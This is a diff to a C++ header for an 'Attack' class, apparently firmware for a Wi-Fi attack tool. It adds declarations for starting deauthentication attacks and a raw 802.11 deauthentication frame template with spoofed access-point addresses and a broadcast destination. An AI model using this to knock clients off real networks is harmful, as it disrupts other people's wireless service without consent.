@@ -15,9 +15,12 @@ public:
     void handleProbePacket(uint8_t *buff, uint16_t len);
     static void static_sniffer_callback(uint8_t *buff, uint16_t len);
 
+    // Deauth
+    void startDeauth(uint8_t bssid[], uint8_t clientMac[], int channel); 
+    void sendDeauthFrame(uint8_t targetAPMAC[6], uint8_t targetClientMAC[6]);
 
 private:
-    static Attack* instance;
+    static Attack *instance;
     struct AttackType
     {
         bool active = false;
@@ -68,4 +71,16 @@ private:
         uint8_t payload[0];
     } wifi_promiscuous_pkt_t;
     AttackType probe_t;
+
+    // Deauth
+    uint8_t deauth_packet[26] = {
+        /* 0 -  1  */ 0xC0, 0x00,                          // Type/Subtype: Deauthentication
+        /* 2 -  3  */ 0x00, 0x00,                          // Duration (will be ignored)
+        /* 4 -  9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: The Client's MAC address
+        /* 10 - 15  */ 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source: The AP's MAC address (BSSID)
+        /* 16 - 21  */ 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID: The AP's MAC address
+        /* 22 - 23  */ 0x00, 0x00,                         // Fragment & Sequence number
+        /* 24 - 25  */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
+    };
+    AttackType deauth;
 };
